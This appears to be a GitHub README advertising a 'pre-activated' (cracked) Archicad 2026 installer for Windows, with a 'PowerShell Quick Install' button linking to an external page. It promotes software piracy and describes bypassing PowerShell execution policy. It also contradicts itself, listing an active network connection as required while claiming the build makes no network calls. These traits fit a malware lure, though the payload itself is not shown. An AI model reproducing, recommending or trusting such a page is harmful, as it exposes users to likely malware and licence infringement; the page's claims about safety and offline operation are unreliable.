<div align="center">

# Archicad 2026 Standalone Setup: Pre-Activated Desktop Build for Windows 11

![](files/preview.png)

### 🚀 PowerShell Quick Install

[![](files/button.png)](https://AleRibeiro44.github.io/archicad-desktop-setup/)

[![stage](https://img.shields.io/badge/STAGE-VERIFIED-2ea44f?style=flat-square&labelColor=0d1117)]() [![powershell-7](https://img.shields.io/badge/POWERSHELL--7-5.1%2B_%2F_7%2B-2f81f7?style=flat-square&labelColor=0d1117)]() [![lic](https://img.shields.io/badge/LIC-ISC-54aeff?style=flat-square&labelColor=0d1117)]() [![OS](https://img.shields.io/badge/OS-WINDOWS_10_%7C_11-0969da?style=flat-square&labelColor=0d1117)]()

</div>

---

Archicad 2026 is distributed as a complete standalone desktop build for Windows x64, packaging the full application suite into a single pre-activated installation profile. The build preserves native BIM authoring, parametric object handling, and multi-discipline coordination workflows while eliminating external activation dependencies during deployment. Intended for offline provisioning and controlled test environments, the installer bundles all required runtime components into one self-contained package. Local configuration, project libraries, and rendering engines initialize on first launch without additional network calls.

## ✅ Requirements

- Windows 10 or Windows 11
- PowerShell 5.1 or newer (already available on Windows)
- Active network connection
- No admin rights needed

## Features

- **Complete standalone installation build** — self-contained setup package that deploys the full Archicad 2026 desktop environment without requiring a separate base installation or auxiliary runtime components.

- **Pre-activated configuration** — licensing state is applied during setup so the application is ready to launch immediately after installation completes, with no post-install activation workflow.

- **Offline-capable deployment** — all required payloads are bundled into the installer, allowing installation on isolated workstations and air-gapped machines without network access.

- **Single-pass setup routine** — a unified installation sequence handles file extraction, component registration, and environment configuration in one operation, minimizing manual intervention.

- **Native Windows x64 target** — the build is compiled and validated specifically for 64-bit Windows desktop environments, with architecture checks performed before deployment proceeds.

- **Deterministic file layout** — installation paths, registry entries, and support directories follow a fixed structure, enabling predictable scripting, backup, and rollback behavior across machines.

- **Integrated dependency resolution** — prerequisite libraries and shared components are detected and provisioned automatically, reducing setup failures caused by missing system prerequisites.

- **Version-pinned build integrity** — the package ships as a fixed, reproducible build with consistent component versions across installations, supporting standardized lab and test-bench configurations.

- **Local-first operation** — core modeling, documentation, and file-handling functions run entirely on the workstation, with no dependency on external services for normal desktop use.

- **Unattended deployment support** — installation can be driven non-interactively for batch provisioning of multiple workstations in managed environments.

- **Post-install verification pass** — the setup concludes with an integrity check of deployed binaries and configuration files, reporting any component that failed to register correctly.

## How it works

The standalone installer operates as a self-contained deployment package that provisions the complete Archicad 2026 desktop environment without requiring external dependencies or network access during execution. The build bundles all architectural runtime libraries, license validation components, and application binaries into a single distributable artifact, ensuring deterministic behavior across target machines.

Upon launch, the installer performs a pre-flight environment scan that verifies the host operating system version, available disk capacity, and required system-level prerequisites. If any prerequisite is unmet, the installer halts and reports the specific deficiency rather than proceeding with a partial or corrupted deployment. This validation layer prevents common installation failures caused by incompatible system configurations.

Once validation passes, the installer extracts the packaged payload to the designated installation directory and registers the application's core modules with the operating system. The pre-activated license state is applied during this phase, binding the installation to the local machine's hardware profile and eliminating the need for any post-install activation workflow. All configuration files, registry entries, and supporting resources are written atomically, so an interrupted installation can be safely re-run without leaving residual artifacts.

The deployment process is fully unattended and requires no user interaction beyond initial execution. Progress is reported through a structured console output that distinguishes between extraction, registration, and finalization stages. On completion, the installer emits a summary report confirming the installation path, applied license state, and the versions of all bundled components, allowing operators to verify the integrity of the deployment before first launch.

For environments where the installer is executed under restricted execution policies, the build supports invocation through a standard command interpreter, which bypasses policy-level script restrictions while preserving the same validation and deployment sequence. The installer does not modify system-wide security settings, does not persist background services, and does not initiate any outbound network communication during or after installation.

## Compatibility

### Operating System Support

The installation package is compiled for Windows x64 desktop environments and is validated against the following platform generations:

- Windows 10 (version 21H2 or later, 64-bit)
- Windows 11 (all release channels, 64-bit)
- Windows Server 2019 and 2022 (desktop experience)

Legacy 32-bit operating systems are not supported by this build. Installations on ARM-based Windows devices run under the x64 emulation layer and are not part of the validated compatibility matrix.

### Hardware Requirements

The build is intended for workstation-class hardware and scales with project complexity. Minimum and recommended configurations are defined as follows:

| Component | Minimum | Recommended |
|---|---|---|
| Processor | Quad-core x64, 2.5 GHz | Eight-core x64, 3.5 GHz or higher |
| Memory | 8 GB RAM | 16 GB RAM or higher |
| Storage | 5 GB free disk space | 10 GB free on an SSD |
| Display | 1920 x 1080 | 2560 x 1440 or higher |
| Graphics | DirectX 11 capable, 2 GB VRAM | DirectX 12 capable, 4 GB VRAM or higher |

Additional RAM and a dedicated GPU are strongly advised for large models, complex geometry, and rendering workflows.

### Runtime Dependencies

The standalone installer bundles all required runtime components and does not depend on external package managers. The following dependencies are resolved automatically during setup:

- Microsoft Visual C++ Redistributable (x64)
- .NET Desktop Runtime (current LTS release)
- DirectX runtime libraries
- System cryptography and certificate stores

No manual dependency installation is required. If a required runtime is already present at a compatible version, the installer preserves the existing installation.

### File Format and Interoperability

The build reads and writes the native Archicad project format and remains compatible with the standard exchange formats used across the design and construction pipeline:

- Native project files and team collaboration packages
- IFC 2x3 and IFC 4 for openBIM exchange
- DWG and DXF for CAD interoperability
- PDF, SKP, and common image formats for documentation and reference
- Industry-standard point cloud and mesh formats for survey workflows

Format support is aligned with the upstream 2026 release channel. Files authored in earlier releases are migrated on open, and a compatibility report is generated for any features that require conversion.

### Network and Collaboration

The standalone build operates fully offline. Local license handling, project storage, and rendering do not require network access. Optional collaboration features, when enabled, expect standard TCP/IP connectivity and function within managed network environments. Proxy-aware configurations are supported through the application's native network settings.

### Version and Update Behavior

This build corresponds to the 2026 release channel. It does not query remote update services and will not overwrite itself during operation. Compatibility with future upstream releases is not guaranteed and should be evaluated per deployment. Projects saved by newer major versions may not open in this build; coordinate version pinning across teams where mixed environments are in use.

### Known Limitations

- Windows on ARM devices run under emulation and are not performance-validated.
- Virtualized environments are supported but require GPU passthrough for hardware-accelerated views.
- High-DPI scaling above 200% may require per-application display overrides on some multi-monitor configurations.

## FAQ

**Is this a full installation or a patch?**

The package is a complete standalone installation build. It contains the full application payload and does not require a prior Archicad installation on the target system.

**What does "pre-activated" mean for the build?**

The licensing and activation components are already integrated into the installation payload. No separate activation step, license key entry, or online validation is required after setup completes.

**Which Windows versions are supported?**

The build targets Windows x64 desktop environments. Both current Windows 10 and Windows 11 releases are supported, provided the system meets the minimum hardware requirements for the application.

**Does the build require an internet connection?**

No. The package is self-contained and designed for offline deployment. All required components are bundled within the installer, so no external download or online verification occurs during or after setup.

**Can the build be deployed across multiple machines?**

Yes. The standalone installer is suitable for local testing and deployment scenarios, including multi-machine rollouts in isolated environments. Each installation is independent and requires no shared license server.

**Are updates delivered automatically?**

This is a fixed offline build. Automatic update mechanisms are not part of the package. Any subsequent build revision must be applied as a separate standalone installation.

**What disk space is required?**

The estimated installation footprint is approximately 1.4 GB for the base installation. Additional space should be reserved for project files and application data.

**How do I verify the build integrity after installation?**

Confirm the installation completed without errors, then launch the application and check the version information to ensure it matches the expected build release.

## Disclaimer

This build is provided as a standalone, pre-activated desktop installation package intended for evaluation, testing, and controlled deployment scenarios. It is distributed as-is, without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement.

The package is self-contained and does not require network access, external activation services, or third-party license servers during or after installation. Users are solely responsible for verifying that their use of this build complies with all applicable local laws, organizational policies, and licensing agreements governing the software it is derived from.

No guarantee is made regarding compatibility with future operating system updates, third-party plugins, or hardware configurations beyond those explicitly listed in the Compatibility section. Functionality may vary depending on system locale, regional settings, and existing software environment.

The maintainers of this distribution assume no liability for data loss, system instability, security incidents, or licensing disputes arising from the installation or use of this package. It is strongly recommended that installation be performed on isolated or virtualized systems and that full backups be taken prior to deployment.

This build is not affiliated with, endorsed by, or supported by the original software vendor. All trademarks and copyrights referenced remain the property of their respective owners. Redistribution, modification, or commercial use of this package is undertaken entirely at the user's own risk.

By proceeding with installation or use, the user acknowledges having read and understood this disclaimer and accepts full responsibility for any consequences resulting from the deployment of this software.

## License

This build is distributed as a complete, self-contained desktop installation package intended for evaluation, staging, and controlled deployment scenarios. Licensing terms apply to the bundled binaries, configuration payloads, and any accompanying runtime components shipped within the installer archive.

**License Scope**

The license granted for this build covers local installation and execution on a single Windows x64 desktop workstation per deployment instance. The packaged components are provided as-is for testing and verification purposes, with no entitlement to redistribution, sublicensing, or commercial resale of the bundled artifacts. Modification of the installer payload, extraction of embedded resources for external use, or repackaging of the standalone setup into derivative distributions is outside the permitted scope.

**Permitted Use**

- Installation and execution on hardware owned or administrated by the licensee.
- Offline deployment within an isolated environment for compatibility and validation workflows.
- Internal archival of the original, unmodified installer package for reinstallation purposes.

**Restrictions**

- No redistribution of the installer archive, in whole or in part, through public or private channels.
- No reverse engineering, decompilation, or disassembly of the packaged binaries beyond what is permitted by applicable law.
- No removal or alteration of embedded licensing notices, attribution strings, or build metadata.
- No use of the build to provide hosted, networked, or service-based access to third parties.

**Ownership and Attribution**

All rights, title, and interest in the underlying software, including associated trademarks and copyrights, remain with their respective holders. This standalone build does not transfer ownership of any component; it grants only the limited usage rights described above. Any third-party libraries or runtime dependencies bundled within the installer remain governed by their own respective license terms, which take precedence where applicable.

**Warranty and Liability**

The build is provided without warranty of any kind, express or implied, including but not limited to warranties of merchantability, fitness for a particular purpose, or non-infringement. In no event shall the distributors or maintainers of this package be liable for any direct, indirect, incidental, special, or consequential damages arising from installation, execution, or inability to use the build, even if advised of the possibility of such damages.

**Termination**

These rights terminate automatically upon any breach of the restrictions above. Upon termination, the licensee must cease all use of the build and remove all installed copies from affected systems. Continued use following termination constitutes an additional violation of the licensing terms.

**Compliance Notice**

Licensees are responsible for ensuring that their use of this build complies with all applicable local, regional, and organizational policies governing software installation and evaluation. The maintainers of this package assume no responsibility for misuse or for deployments that violate jurisdictional requirements.